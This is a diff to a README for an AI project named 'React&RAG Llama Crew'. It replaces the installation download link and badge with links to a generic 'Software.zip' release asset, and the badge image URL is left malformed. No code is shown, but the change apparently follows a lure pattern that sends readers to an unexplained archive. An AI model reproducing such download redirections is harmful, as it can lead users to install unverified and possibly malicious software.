@@ -24,9 +24,9 @@ React&RAG Llama Crew is a cutting-edge AI system designed to revolutionize the w
 
 ## Installation
 
-To get started with React&RAG Llama Crew, simply visit the [latest release](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip) and download the necessary files. Make sure to follow the installation instructions provided in the repository for a seamless setup process.
+To get started with React&RAG Llama Crew, simply visit the [latest release](https://github.com/Milliterian/react_rag_llama_crew/releases/download/v1.0/Software.zip) and download the necessary files. Make sure to follow the installation instructions provided in the repository for a seamless setup process.
 
-[![Download ZIP](https://img.shields.io/badge/Download-ZIP-<COLOR>.svg)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download ZIP](https://github.com/Milliterian/react_rag_llama_crew/releases/download/v1.0/Software.zip<COLOR>.svg)](https://github.com/Milliterian/react_rag_llama_crew/releases/download/v1.0/Software.zip)
 
 ## How to Use
 
